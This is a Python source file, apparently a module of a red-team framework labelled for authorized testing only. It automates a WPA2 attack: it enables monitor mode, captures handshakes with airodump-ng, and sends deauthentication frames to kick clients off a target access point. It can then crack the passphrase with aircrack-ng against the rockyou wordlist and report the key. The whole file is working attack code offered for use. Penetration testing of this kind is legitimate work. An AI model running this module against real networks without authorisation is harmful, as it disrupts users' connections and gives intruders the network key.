"""RedTeam Framework - Module: wireless/wpa2_capture"""
from __future__ import annotations
import asyncio, glob, os, re
from typing import Any, Dict, List
from framework.modules.base import BaseModule, Finding, ModuleResult, Severity

class WPA2CaptureModule(BaseModule):
    def info(self) -> Dict[str, Any]:
        return {"name":"wpa2_capture","description":"WPA2 handshake capture using aircrack-ng suite. AUTHORIZED TESTING ONLY.","author":"RTF Core Team","category":"wireless","version":"1.0","tags":["wireless","wpa2","handshake"]}
    def _declare_options(self) -> None:
        self._register_option("interface","Wireless interface (e.g. wlan0)",required=True)
        self._register_option("bssid","Target AP BSSID",required=False,default="")
        self._register_option("essid","Target SSID",required=False,default="")
        self._register_option("channel","Target WiFi channel",required=False,default="")
        self._register_option("capture_file","Output capture file base",required=False,default="/tmp/capture")
        self._register_option("deauth_count","Deauth frames to send (0=passive only)",required=False,default=5,type=int)
        self._register_option("capture_duration","Capture duration seconds",required=False,default=60,type=int)
        self._register_option("crack_after","Attempt to crack after capture",required=False,default=False,type=bool)
        self._register_option("wordlist","Wordlist for cracking",required=False,default="/usr/share/wordlists/rockyou.txt")
    async def run(self) -> ModuleResult:
        interface=self.get("interface"); bssid=self.get("bssid"); essid=self.get("essid")
        channel=self.get("channel"); capture_file=self.get("capture_file")
        deauth_count=self.get("deauth_count"); capture_duration=self.get("capture_duration")
        crack_after=self.get("crack_after"); wordlist=self.get("wordlist")
        self.require_tool("airmon-ng"); self.require_tool("airodump-ng")
        self.log.info(f"Enabling monitor mode on {interface}")
        await self.run_command_async(["airmon-ng","start",interface],timeout=15)
        mon_iface=f"{interface}mon"
        dump_cmd=["airodump-ng","--write",capture_file,"--output-format","pcap"]
        if bssid: dump_cmd+=["--bssid",bssid]
        if essid: dump_cmd+=["--essid",essid]
        if channel: dump_cmd+=["--channel",channel]
        dump_cmd.append(mon_iface)
        self.log.info(f"Starting capture — duration: {capture_duration}s")
        proc=await asyncio.create_subprocess_exec(*dump_cmd,stdout=asyncio.subprocess.DEVNULL,stderr=asyncio.subprocess.DEVNULL)
        try:
            if deauth_count>0 and bssid:
                await asyncio.sleep(5)
                self.require_tool("aireplay-ng")
                await self.run_command_async(["aireplay-ng","--deauth",str(deauth_count),"-a",bssid,mon_iface],timeout=30)
            if capture_duration>0:
                await asyncio.sleep(capture_duration); proc.terminate()
            else:
                await proc.wait()
        finally:
            try: proc.terminate()
            except Exception: pass
            await self.run_command_async(["airmon-ng","stop",mon_iface],timeout=15)
        cap_files=[]
        for ext in (".cap","-01.cap"):
            f=capture_file+ext
            if os.path.exists(f): cap_files.append(f)
        if not cap_files:
            cap_files=glob.glob(f"{capture_file}-*.cap")
        findings=[]; crack_result=None
        if cap_files:
            findings.append(self.make_finding(title=f"WPA2 capture saved: {cap_files}",target=bssid or essid or interface,severity=Severity.HIGH,description="WPA2 handshake capture file(s) obtained.",evidence={"files":cap_files},tags=["wireless","wpa2"]))
            if crack_after and os.path.exists(wordlist):
                for cap in cap_files:
                    crack_out,_,crack_rc = await self.run_command_async(["aircrack-ng",cap,"-w",wordlist,"-q"],timeout=3600)
                    if "KEY FOUND" in crack_out:
                        m=re.search(r"KEY FOUND! \[ (.+?) \]",crack_out)
                        if m:
                            key=m.group(1); crack_result=key
                            findings.append(self.make_finding(title=f"WPA2 Key cracked: {key}",target=bssid or essid,severity=Severity.CRITICAL,description=f"WPA2 passphrase: {key}",evidence={"key":key,"cap":cap},tags=["wireless","password-cracking"]))
        return ModuleResult(success=bool(cap_files),output={"interface":interface,"capture_files":cap_files,"cracked_key":crack_result},findings=findings)
